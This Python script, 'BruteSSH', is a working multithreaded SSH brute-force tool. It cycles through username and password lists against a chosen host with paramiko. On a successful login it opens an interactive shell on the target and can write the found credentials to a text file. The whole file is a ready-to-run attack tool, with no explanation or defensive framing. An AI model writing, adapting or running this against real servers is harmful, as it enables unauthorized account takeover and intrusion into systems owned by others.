#!/usr/bin/python3

import os
import argparse
import paramiko
import time
import concurrent.futures
try:
  import interactive
except ImportError:
  from . import interactive

parser = argparse.ArgumentParser(
  prog='BruteSSH - Made by XvnG0D\r\n',
  description='Brute Force SSH Client\r\n',
  usage="python3 brutessh.py --host 127.0.0.1 --user root --pass-list passlist.txt [OPTIONS]"
)

def range_threads(value):
  ivalue = int(value)
  if ivalue < 1:
    raise argparse.ArgumentTypeError(f'Invalid number of threads: {value}')
  if ivalue > 10:
    raise argparse.ArgumentTypeError(f'Maximum number of threads is 10: {value}')
  return ivalue

parser.add_argument('--host', '-H', metavar='127.0.0.1', required=True)
parser.add_argument('--port', '-s', metavar='22', default=22, type=int)
parser.add_argument('--threads', '-t', metavar='5',default=5, type=range_threads)
parser.add_argument('--output', '-o', metavar='output', help='Create a txt file with the output of the successful login')

user_group = parser.add_mutually_exclusive_group(required=True)
user_group.add_argument('--user', '-u', metavar='root', type=str)
user_group.add_argument('--user-list', '-U', metavar='userlist.txt')

pass_group = parser.add_mutually_exclusive_group(required=True)
pass_group.add_argument('--password', '-p', metavar='password')
pass_group.add_argument('--pass-list', '-P', metavar='passlist.txt')

args = parser.parse_args()

host = args.host
port = args.port
user = args.user
user_list = args.user_list
password = args.password
pass_list = args.pass_list
num_threads = args.threads
output_file = args.output

password_found = False
endTime = 0
startTime = 0

if user_list and not os.path.isfile(user_list):
  print('User list not found')
  exit()

if pass_list and not os.path.isfile(pass_list):
  print('Password list not found')
  exit()

def convert_time(seconds):
  minutes, seconds = divmod(seconds, 60)
  hours, minutes = divmod(minutes, 60)
  return hours, minutes, seconds

def search_time():
  global startTime
  global endTime
  totalTime = endTime - startTime
  hours, minutes, seconds = convert_time(totalTime)
  print(f'Total search time: {hours:.0f} hours, {minutes:.0f} minutes, {seconds:.2f} seconds')

def ssh_client_connect(host, user, passwd, port=22):
  global password_found
  if password_found:
    return
  clientSSH = paramiko.SSHClient()
  clientSSH.load_system_host_keys()
  clientSSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try:
    print(f'Trying with {user}:{passwd}')
    clientSSH.connect(host, username=user, password=passwd, port=port)
    global endTime
    endTime = time.time()
    search_time()
    print(f'[+] -> Login found: {user}:{passwd}')
    password_found = True
    channelSSH = clientSSH.get_transport().open_session()
    channelSSH.get_pty()
    channelSSH.invoke_shell()
    interactive.interactive_shell(channelSSH)
    channelSSH.close()
    clientSSH.close()
    if output_file:
      with open(f'{output_file}.txt', 'w') as f:
        f.write(f'Host: {host}\nPort: {port}\nUser: {user}\nPassword: {passwd}\n')
      print(f'[+] -> Output saved in {output_file}.txt')
  except paramiko.AuthenticationException:
    clientSSH.close()
  except Exception as e:
    print('Connection failed, please verify your connection')
    clientSSH.close()

def read_passwords_from_file(password_file):
  with open(password_file, 'r') as f:
    passwords = [line.strip() for line in f]
    return passwords

def read_users_from_file(user_file):
  with open(user_file, 'r') as f:
    users = [line.strip() for line in f]
    return users


def try_parallel(host, user_list, password_list, port=22, num_threads=5):
  global password_found
  with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
    futures = None
    if (user_list and password_list):
      futures = [executor.submit(ssh_client_connect, host, user, password, port) for user in user_list for password in password_list]
    elif (user_list and not password_list):
      global password
      futures = [executor.submit(ssh_client_connect, host, user, password, port) for user in user_list]
    elif (password_list and not user_list):
      global user
      futures = [executor.submit(ssh_client_connect, host, user, password, port) for password in password_list]
    for future in concurrent.futures.as_completed(futures):
      if password_found:
        executor.shutdown(wait=False, cancel_futures=True)
        break

def handleInit():
  global startTime
  global endTime
  if password and user:
    ssh_client_connect(host, user, password, port)
  elif user and pass_list:
    passwords = read_passwords_from_file(pass_list)
    startTime = time.time()
    try_parallel(host, None, passwords, port, num_threads)
    if not password_found:
      endTime = time.time()
      search_time()
      print('Password not found')
      exit()
  elif user_list and password:
    users = read_users_from_file(user_list)
    startTime = time.time()
    try_parallel(host, users, None, port, num_threads)
    if not password_found:
      endTime = time.time()
      search_time()
      print('Password not found')
      exit()
  else:
    users = read_users_from_file(user_list)
    passwords = read_passwords_from_file(pass_list)
    startTime = time.time()
    try_parallel(host, users, passwords, port, num_threads)
    if not password_found:
      endTime = time.time()
      search_time()
      print('Password not found')
      exit()

def title():
  print(r'''
 _______ ______   __   __ _______ _______ _______ _______ __   __
|  _    |    _ | |  | |  |       |       |       |       |  | |  |
| |_|   |   | || |  | |  |_     _|    ___|  _____|  _____|  |_|  |
|       |   |_||_|  |_|  | |   | |   |___| |_____| |_____|       |
|  _   ||    __  |       | |   | |    ___|_____  |_____  |       |
| |_|   |   |  | |       | |   | |   |___ _____| |_____| |   _   |
|_______|___|  |_|_______| |___| |_______|_______|_______|__| |__|
  ''')

if __name__ == '__main__':
  title()
  handleInit()
